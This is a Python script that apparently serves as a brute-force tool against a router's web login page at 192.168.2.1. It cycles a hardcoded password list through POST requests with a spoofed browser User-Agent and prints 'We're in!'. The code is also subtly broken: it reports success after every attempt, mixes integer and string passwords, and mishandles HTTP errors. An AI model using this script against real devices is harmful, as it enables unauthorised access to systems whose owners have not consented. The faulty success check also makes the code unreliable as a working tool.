from urllib import parse, request, error
import time
import threading


class Bruter:

    baseUrl = "http://192.168.2.1/"
    passwords = ["d41d8cd98f00b204e9800998ecf8427e", "ef21cdedfaedfad21124ceff", 312545405042, 454545454212454, 89785212477025]
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
    }
    passwordField = ''
    usernameField = ''
    parameters = {}

    def __init__(self, loginUrl=None, usernameField=None, passwordField=None, parameters={}, headers={}):
        if loginUrl:
           self.loginUrl = loginUrl
        else:
            self.loginUrl = self.baseUrl + "cgi-bin/login.exe"
        if parameters:
            self.parameters = parameters
        if passwordField:
            self.passwordField = passwordField
        if usernameField:
            self.usernameField = usernameField
        if headers:
            self.headers.update(headers)


    def startBruteforce(self):
        print("[!] Starting brutal force on %s" % self.loginUrl)
        for password in self.passwords:
            print("[>] Trying %s" % self.parameters)
            self.attemptLogin(password=password)

    def attemptLogin(self, username=None, password=None):
        if username:
            self.parameters[self.usernameField] = username
        if password:
            self.parameters[self.passwordField] = password

        request_ = self.buildRequest(self.loginUrl, method="POST")
        response = self.sendRequest(request_)

        if not username:
            print("We're in! \n" + response)

        return response

    def sendRequest(self, request_):
        try:
            response = request.urlopen(request_)
            response = response.read()

        except error.HTTPError as e:
            print(str(e.code))
            pass
        response = response.decode("utf8")
        return response

    def buildRequest(self, url, headers={}, method="GET"):
        if headers:
            self.headers.update(headers)
        parameters = parse.urlencode(self.parameters).encode("utf8")
        request_ = request.Request(url, data=parameters, headers=self.headers, method=method)
        return request_

    def getUrlContent(self, url, headers={}):
        request_ = self.buildRequest(url, headers)
        response = self.sendRequest(request_)
        return response

if __name__ == '__main__':
    passwordField = "pws"
    bruter = Bruter(passwordField=passwordField)
    bruter.startBruteforce()
